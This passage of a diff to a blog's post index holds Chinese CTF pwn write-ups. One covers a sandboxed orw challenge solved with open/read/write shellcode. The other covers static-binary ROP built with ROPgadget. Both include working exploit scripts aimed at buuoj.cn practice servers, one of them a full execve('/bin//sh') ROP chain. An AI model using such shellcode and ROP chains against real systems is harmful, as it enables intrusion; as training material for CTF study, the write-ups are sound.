dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">shell = payload()</span><br><span class="line">q.sendline(shell)</span><br><span class="line">q.interactive()</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/1643119981017.png" alt="1643119981017"></p>
-]]></content>
-      <categories>
-        <category>笔记</category>
+        <category>writeup</category>
       </categories>
       <tags>
         <tag>pwn</tag>
@@ -1236,24 +1236,24 @@ callq 在栈里存放一个8位的返回地址
       </tags>
   </entry>
   <entry>
-    <title>pwnable_orw</title>
-    <url>/2022/01/21/%E6%B2%99%E7%AE%B1%E5%88%9D%E4%BD%93%E9%AA%8C%EF%BC%88pwnable_orw)/</url>
+    <title>静态编译rop题目解题法</title>
+    <url>/2021/12/20/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91rop%E9%A2%98%E7%9B%AE%E8%A7%A3%E9%A2%98%E6%B3%95/</url>
     <content><![CDATA[<span id="more"></span>
-<h1 id="沙箱初体验（pwnable-orw"><a href="#沙箱初体验（pwnable-orw" class="headerlink" title="沙箱初体验（pwnable_orw)"></a>沙箱初体验（pwnable_orw)</h1><p>确实很新奇嗷，照着buu上题目顺序来做，没想到这么快就接触到了沙箱的题目，<del>而我堆都还没玩明白</del></p>
-<p>那废话不多说，先来看看文件吧。这时候问题就出现了，不知道为啥就被拦下了，附件不让下载。</p>
-<p><img src="/img/1643120343756.png" alt="1643120343756"></p>
-<p>xs，只好去网上找dalao们写的博客，好巧不巧就发现了这是个沙箱的题目。</p>
-<p>于是只好拿网上的图片来看</p>
-<p><img src="/img/1643120358026.png" alt="1643120358026"></p>
-<p>搞懂了基本原理，那就实操一下，只能利用open、read、write三个函数来读取flag。</p>
-<p>看完dalao的博客，真的学到了，居然还有这样的方法来拿flag，<del>哈哈哈哈哈哈</del></p>
-<p><img src="/img/1643120371790.png" alt="1643120371790"></p>
-<p>最后脚本附上一跑，就真成了<del>（我是二傻子）</del></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27261</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;shellcode:&#x27;</span>, shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Linux系统调用-int-80h（int-0x80）"><a href="#Linux系统调用-int-80h（int-0x80）" class="headerlink" title="Linux系统调用 int 80h（int 0x80）"></a>Linux系统调用 int 80h（int 0x80）</h2><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>在计算机中，系统调用（英语：system call），又称为系统呼叫，指运行在使用者空间的程序向操作系统内核请求需要更高权限运行的服务。 系统调用提供了用户程序与操作系统之间的接口。大多数系统交互式操作需求在内核态执行。如设备IO操作或者进程间通信。</p>
+<p>Linux的系统调用通过int 80h实现，用系统调用号来区分入口函数。 操作系统实现系统调用的基本过程是：<br>      应用程序调用库函数（API）；<br>      API将系统调用号存入EAX，然后通过中断调用使系统进入内核态；<br>      内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；<br>     系统调用完成相应功能，将返回值存入EAX，返回到中断处理函数；<br>     中断处理函数返回到API中；<br>     API将EAX返回给应用程序。</p>
+<h5 id="很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。"><a href="#很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。" class="headerlink" title="很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。"></a><del>很好，上面都不重要，系统调用遇到再说，真静态编译的题目还得看下面解法。</del></h5><h2 id="判断静态编译"><a href="#判断静态编译" class="headerlink" title="判断静态编译"></a>判断静态编译</h2><p><strong>只要ida打开看起来很复杂的，都是静态编译的结果。这种情况下的好处就是不会调用libc中的东西，所以我们不用泄露libc版本来利用里libc函数。</strong></p>
+<h2 id="解决题目"><a href="#解决题目" class="headerlink" title="解决题目"></a>解决题目</h2><p>ROPgadget有一个很强大的功能，直接利用程序中的片段拼凑rop链。</p>
+<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">ROPgadget</span> --<span class="comment">binary</span> <span class="comment">rop</span> --<span class="comment">ropchain</span></span><br></pre></td></tr></table></figure>
 
+<h3 id="例题：inndy-rop（假的，只是为了静态编译放这儿的）"><a href="#例题：inndy-rop（假的，只是为了静态编译放这儿的）" class="headerlink" title="例题：inndy_rop（假的，只是为了静态编译放这儿的）"></a>例题：inndy_rop<del>（假的，只是为了静态编译放这儿的）</del></h3><p>32位文件，静态编译，开NX，所以直接</p>
+<p><img src="/img/1643119949088.png" alt="1643119949088"></p>
+<p> 最后稍作修改 </p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import <span class="keyword">pack</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">q</span> = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25783</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">def payload():</span><br><span class="line">    p = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xc</span> + <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += <span class="keyword">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">shell = payload()</span><br><span class="line">q.sendline(shell)</span><br><span class="line">q.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/1643119981017.png" alt="1643119981017"></p>
 ]]></content>
       <categories>
-        <category>writeup</category>
+        <category>笔记</category>
       </categories>
       <tags>
         <tag>pwn</tag>
